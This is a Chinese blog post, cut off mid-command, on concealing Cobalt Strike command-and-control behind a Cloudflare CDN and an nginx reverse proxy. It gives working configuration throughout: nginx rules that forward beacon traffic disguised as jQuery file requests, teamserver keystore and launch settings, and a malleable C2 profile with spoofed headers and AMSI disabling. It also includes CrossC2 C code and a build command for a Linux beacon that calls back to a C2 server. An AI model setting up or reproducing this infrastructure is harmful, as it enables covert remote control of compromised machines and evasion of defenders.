        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>CobaltStrike在使用过程中经常会涉及到一些安全隐藏方面的配置，我使用的方案是CDN加上nginx转发，再使用profile来修改流量特征，本文对一些细节上的点进行记录，方便以后查阅。首先是域名和CDN上的配置，然后是CobaltStrike一些证书、profile的配置，最后是前置服务器(nginx)的一些配置方法。</p><h2 id="0x02-CDN和域名相关配置"><a href="#0x02-CDN和域名相关配置" class="headerlink" title="0x02 CDN和域名相关配置"></a>0x02 CDN和域名相关配置</h2><p>在freenom申请测试域名(google.tk)后，到cloudflare中获取名称服务器地址:<br><img src="https://i.loli.net/2021/08/05/gYbmjWcxEZJnOFh.png"><br>然后在freenom中配置:<br><img src="https://i.loli.net/2021/08/05/amWJj8v31VLpd5i.png"></p><p><img src="https://i.loli.net/2021/08/05/DUxprVQndS9sc8A.png"><br>CDN中配置A记录，解析IP，并使用代理：<br><img src="https://i.loli.net/2021/08/10/rytjsFLmpWhCDN3.png"><br>这样就能使用cloudflare的CDN加速了，然后开启nginx，配置server_name，访问：<br><img src="https://i.loli.net/2021/08/05/4SGJMUNEm3P18Li.png"></p><p>接下来为域名配置源服务器证书，选择创建证书：<br><img src="https://i.loli.net/2021/08/05/H1fLYowxcvXWaP7.png"></p><p><img src="https://i.loli.net/2021/08/05/clJkq84tH65aoxG.png"><br>将获取到的证书和key文件配置在nginx中，在ubuntu上修改nginx配置文件 <code>/etc/nginx/nginx.conf</code>：：</p><pre class="line-numbers language-groovy"><code class="language-groovy">server <span class="token punctuation">{</span>    listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>    server_name m<span class="token operator">.</span>test<span class="token operator">.</span>com<span class="token punctuation">;</span>    ssl_certificate  key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_ssl<span class="token operator">.</span>pem<span class="token punctuation">;</span>    ssl_certificate_key key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_key<span class="token punctuation">;</span>    ssl_session_timeout 5m<span class="token punctuation">;</span>    ssl_ciphers TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">256</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA384<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>CHACHA20<span class="token operator">-</span>POLY1305<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>CHACHA20<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES128<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES128<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES256<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>3DES<span class="token punctuation">:</span>RSA<span class="token operator">+</span>3DES<span class="token punctuation">:</span><span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_protocols TLSv1<span class="token operator">.</span><span class="token number">1</span> TLSv1<span class="token operator">.</span><span class="token number">2</span> TLSv1<span class="token operator">.</span><span class="token number">3</span><span class="token punctuation">;</span>    ssl_prefer_server_ciphers on<span class="token punctuation">;</span>    location <span class="token operator">/</span> <span class="token punctuation">{</span>        root <span class="token string">/var/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>        index index<span class="token operator">.</span>html index<span class="token operator">.</span>htm<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置好了 <code>nginx -t</code> 检查,然后<code>nginx -s reload</code>重载配置:<br><img src="https://i.loli.net/2021/08/05/TCl2UMb9B1JQj7p.png"></p><p>证书配置好以后，在cloudflare中将SSL/TLS加密模式设置为严格：<br><img src="https://i.loli.net/2021/08/05/8b4o6EtMmQviIkx.png"><br>访问域名，严格的https已经启用，从客户端到CDN，CDN到服务器全部使用HTTPS：<br><img src="https://i.loli.net/2021/08/05/jzmSAcKO6NPxron.png"></p><h2 id="0x03-nginx的反向代理配置"><a href="#0x03-nginx的反向代理配置" class="headerlink" title="0x03 nginx的反向代理配置"></a>0x03 nginx的反向代理配置</h2><p>反向代理配置就是匹配到特定的路径时，nginx将流量转发到后端的CobaltStrike处理，主要有四个路径，用于心跳和接收命令的GET包，用于返回命令执行结果等的POST包，剩下两个是x86和x64的stager，然后匹配到了就使用proxy_pass转发，比如后面会用到jq的profile，在profile中很容易找到这些url，然后配置nginx.conf关键部分如下：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">443</span> <span class="token keyword">ssl</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#要处理的域名</span>    <span class="token keyword">server_name</span> m<span class="token punctuation">.</span>test<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#证书</span>    <span class="token keyword">ssl_certificate</span>  key<span class="token operator">/</span>xxx<span class="token punctuation">.</span>com_ssl<span class="token punctuation">.</span>pem<span class="token punctuation">;</span>    <span class="token keyword">ssl_certificate_key</span> key<span class="token operator">/</span>xxx<span class="token punctuation">.</span>com_key<span class="token punctuation">;</span>    <span class="token keyword">ssl_session_timeout</span> 5m<span class="token punctuation">;</span>    <span class="token keyword">ssl_ciphers</span> TLS13<span class="token operator">-</span>AES<span class="token number">-256</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA384<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>CHACHA20<span class="token operator">-</span>POLY1305<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token number">-128</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token number">-128</span><span class="token operator">-</span>CCM<span class="token number">-8</span><span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token number">-128</span><span class="token operator">-</span>CCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>CHACHA20<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES128<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES128<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES256<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>3DES<span class="token punctuation">:</span>RSA<span class="token operator">+</span>3DES<span class="token punctuation">:</span><span class="token operator">!</span>MD5<span class="token punctuation">;</span>        <span class="token keyword">ssl_protocols</span> TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span> TLSv1<span class="token number">.3</span><span class="token punctuation">;</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#流量转发</span>    <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>slim<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">.</span>slim<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#默认首页</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>        <span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-CobaltStrike服务配置"><a href="#0x04-CobaltStrike服务配置" class="headerlink" title="0x04 CobaltStrike服务配置"></a>0x04 CobaltStrike服务配置</h2><p>前置nginx基本配置好了后，接下来进行一些CobaltStrike的配置。主要是证书和profile配置。将压缩包上传到服务器解压后：<br><img src="https://i.loli.net/2021/08/08/G9FqjARPEr1nS8a.png"><br>先用keytool生成证书，这个证书可以用来做为管理端口(默认是50050)或者监听器的端口上的https证书，只要不用默认的随便配置就好：</p><pre class="line-numbers language-cmd?linenums"><code class="language-cmd?linenums">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 1314520.com -validity 50000 -dname "CN=, OU=1314520.com, O=1314520.com, L=Redmond, S=Washington, C=US"keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编辑启动脚本(Linux下的teamserver或者Windows下的teamserver.bat)中的端口和证书配置密码:</p><pre class="line-numbers language-java?linenums"><code class="language-java?linenums">java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -Xms512m -Xmx1024m -Dcobaltstrike.server_port=5555 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="简单的Profile配置"><a href="#简单的Profile配置" class="headerlink" title="简单的Profile配置"></a>简单的Profile配置</h3><p>启动参数调好后，Profile是用的<a href="https://github.com/threatexpress/malleable-c2">malleable-c2</a>，在配置文件中按需修改下面的参数:</p><pre class="line-numbers language-gams"><code class="language-gams">set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"; # 这个改了不要再变，否则上不了线set dns_idle        "8.8.8.8";   #dns的特征修改#header "Content-Type" "application/javascript; charset=utf-8"; #注释默认Type,防止cf缓存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后启动<code>teamserve vpsip Password Profile</code>，如Linux下：</p><pre class="line-numbers language-bash?linenums"><code class="language-bash?linenums">chmod +x teamserver./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>持久化可以将下面的命令写入文件，如start_teamserver,chmod赋予执行权限后，可以方便的使用./start_teamserver启动，停止就用<code>pkill java</code>，脚本如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> ./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile <span class="token operator">></span>/dev/null 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行<code>./start_teamserver</code>后可以尝试链接vps5555端口的teamserver了:<br><img src="https://i.loli.net/2021/08/10/Iaywfv31V6HbgLh.png"></p><h3 id="CobaltStrike监听器配置"><a href="#CobaltStrike监听器配置" class="headerlink" title="CobaltStrike监听器配置"></a>CobaltStrike监听器配置</h3><p>进入teamserver后，配置监听器。CDN在HTTPS上会检查SNI用不了域前置(http上可以修改host)，这里使用加速过的域名：<br><img src="https://i.loli.net/2021/08/10/RhiCeKNSg6WPDY5.png"><br>测试上线时会发现执行命令、执行stager不返回的情况，这是因为cdn的缓存原因，到CDN设置页面规则，对js文件绕过缓存：<br><img src="https://i.loli.net/2021/08/10/SiEUeATYO32w9uk.png"><br>配好后清除下缓存：<br><img src="https://i.loli.net/2021/08/10/fdCnIz91qYBpkNS.png"><br>然后测试上线和命令执行返回：<br><img src="https://i.loli.net/2021/08/10/yYZ1pXkCGiOBndm.png"></p><h3 id="Linux和Windows中Profile通用配置"><a href="#Linux和Windows中Profile通用配置" class="headerlink" title="Linux和Windows中Profile通用配置"></a>Linux和Windows中Profile通用配置</h3><p>有时候我们想使用Crossc2来上线cs,但是我们的windows中配置了profile的，linux无法直接上线，所以需要在Crossc2中配置请求的路径，参考<a href="https://github.com/gloxec/CrossC2/tree/cs4.1/protocol_demo">协议演示</a>：<br>根据demo，准了新的init.profile,init.c<br>init.profile：</p><pre class="line-numbers language-gams"><code class="language-gams">set sample_name "daidaiwoya";set sleeptime "2000";set jitter    "15";set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko";set host_stage "false";set maxdns          "255";set dns_max_txt     "252";set dns_idle        "8.8.8.8"; set dns_sleep       "500"; set dns_stager_prepend ".resources.741256.";set dns_stager_subhost ".feeds.952365.";https-certificate {    set C   "US";    set CN  "jquery.com";    set O   "jQuery";    set OU  "Certificate Authority";    set validity "365";}http-get {    set uri "/getversion";    set verb "GET";    client {        header "Accept" "text/xml";        header "Host" "www.google.com";        header "Referer" "http://www.google.com/";        header "Accept-Encoding" "gzip, deflate";        metadata {            base64url;            prepend "SID=";            header "Cookie";        }    }    server {        header "Server" "nginx";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "charset=utf-8";        header "X-Cache" "bypass";        output {            base64;            prepend "sign=";            append "5.4.3";            print;        }    }}http-post {    set uri "/kernel.org";    set verb "POST";    client {        header "Accept" "text/xml";        header "Host" "www.google.com";        header "Referer" "http://www.google.com/";        header "Accept-Encoding" "gzip, deflate";        id {            base64;            prepend "__cfduid=";            header "Cookie";        }        output {            base64;            print;        }    }    server {        header "Server" "nginx";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "charset=utf-8";        header "X-Cache" "bypass";        output {            mask;            base64url;            prepend "sign=";            append "code=2";            print;        }    }}post-ex {    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";    set obfuscate "true";    set smartinject "true";    set amsi_disable "true";}http-config {    set trust_x_forwarded_for "true";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>init.c</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token comment" spellcheck="true">// gcc -shared profile.c -o libprofile.so</span><span class="token comment" spellcheck="true">// ./genCrossC2.Linux 192.168.11.1 8086 null libprofile.so Linux x64 ./shell</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_get_send</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>reqData<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//修改请求URL和c2profile文件中一致</span>    <span class="token keyword">char</span> <span class="token operator">*</span>requestBody <span class="token operator">=</span> <span class="token string">"GET /%s HTTP/1.1\r\n"</span>        <span class="token string">"Host: www.google.com\r\n"</span>        <span class="token string">"Accept: text/xml\r\n"</span>        <span class="token string">"Accept-Encoding: gzip, br\r\n"</span>        <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko\r\n"</span>        <span class="token string">"Cookie: SID=%s\r\n"</span>        <span class="token comment" spellcheck="true">//"Referer: https://www.google.com/\r\n"</span>        <span class="token string">"Connection: close\r\n\r\n"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> postPayload<span class="token punctuation">[</span><span class="token number">20000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">,</span> requestBody<span class="token punctuation">,</span> <span class="token string">"getversion"</span><span class="token punctuation">,</span> reqData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span>  <span class="token function">strlen</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>  <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> postPayload<span class="token punctuation">,</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_post_send</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>reqData<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>id<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>requestBody <span class="token operator">=</span> <span class="token string">"POST /%s HTTP/1.1\r\n"</span>        <span class="token string">"Host: www.google.com\r\n"</span>        <span class="token string">"Accept: text/xml\r\n"</span>        <span class="token string">"Accept-Encoding: gzip, br\r\n"</span>        <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko\r\n"</span>        <span class="token string">"Cookie: __cfduid=%s\r\n"</span>        <span class="token string">"Referer: https://www.google.com/\r\n"</span>        <span class="token string">"Connection: close\r\n"</span>        <span class="token string">"Content-Length: %d\r\n\r\n%s"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>postPayload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>requestBody<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">strlen</span><span class="token punctuation">(</span>reqData<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">,</span> requestBody<span class="token punctuation">,</span> <span class="token string">"kernel.org"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>reqData<span class="token punctuation">)</span><span class="token punctuation">,</span> reqData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span>  <span class="token function">strlen</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>  <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> postPayload<span class="token punctuation">,</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">find_payload</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>rawData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> rawData_len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>start<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>end<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>payload_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//find_payload() 从原始数据中，找到以"ffffffff1"字符串开始，"eeeeeeee2"字符串结束中间包含的数据</span>    <span class="token comment" spellcheck="true">// ffffffff1AAAABBBBCCCCDDDDeeeeeeee2 -> AAAABBBBCCCCDDDD</span>    <span class="token comment" spellcheck="true">// *payload_len = xx; // 返回找到的payload长度</span>    <span class="token comment" spellcheck="true">// return payload; // 返回找到的payload</span>    rawData <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> start<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>payload_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>rawData<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token operator">*</span>payload_len <span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> rawData<span class="token punctuation">,</span> <span class="token operator">*</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> payload<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_get_recv</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>rawData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> rawData_len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>start <span class="token operator">=</span> <span class="token string">"sign="</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token string">"5.4.3"</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> payload_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token function">find_payload</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> rawData_len<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> <span class="token operator">&amp;</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span> payload_len<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_post_recv</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>rawData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> rawData_len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>start <span class="token operator">=</span> <span class="token string">"sign="</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token string">"code=2"</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> payload_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token function">find_payload</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> rawData_len<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> <span class="token operator">&amp;</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span> payload_len<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Profile检查:</p><pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">java</span> -XX<span class="token punctuation">:</span>ParallelGCThreads<span class="token operator">=</span><span class="token number">4</span> -Duser<span class="token operator">.</span>language<span class="token operator">=</span>en -XX<span class="token punctuation">:</span><span class="token operator">+</span>UseParallelGC -classpath <span class="token 